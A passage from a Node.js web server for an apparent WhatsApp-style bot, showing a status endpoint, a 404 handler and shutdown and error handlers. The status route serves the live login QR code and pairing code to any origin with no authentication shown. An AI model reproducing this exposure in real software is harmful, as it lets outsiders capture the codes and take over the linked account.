            }
        });
        return;
    }
    
    // ===== API STATUS =====
    else if (url === '/api/status') {
        let pairingCode = null;
        for (const [_, data] of pairingCodes) {
            if (Date.now() - data.timestamp < 300000) {
                pairingCode = data.code;
                break;
            }
        }
        
        res.writeHead(200, { 
            'Content-Type': 'application/json',
            'Access-Control-Allow-Origin': '*'
        });
        res.end(JSON.stringify({ 
            status: botStatus,
            hasQR: !!latestQR,
            qr: latestQR,
            pairingCode: pairingCode,
            prefix: global.BOT_PREFIX || '.',
            timestamp: new Date().toISOString(),
            uptime: process.uptime()
        }));
    }
    
    else {
        res.writeHead(404, { 'Content-Type': 'text/html' });
        res.end(`<center><h1>404 - Page Not Found</h1><a href="/">🏠 Go Home</a></center>`);
    }
});

server.listen(PORT, () => {
    console.log(`🌐 Web server running at http://localhost:${PORT}`);
    console.log(`📁 Session folder: ${path.resolve(AUTH_FOLDER)}`);
    loadPrefix();
});

process.on('SIGINT', () => {
    console.log('\n👋 Shutting down gracefully...');
    if (presenceInterval) clearInterval(presenceInterval);
    if (sock) sock.end();
    process.exit(0);
});

process.on('uncaughtException', (err) => {
    console.error('⚠️ Uncaught Exception:', err);
});

process.on('unhandledRejection', (reason, promise) => {
    console.error('⚠️ Unhandled Rejection:', reason);
});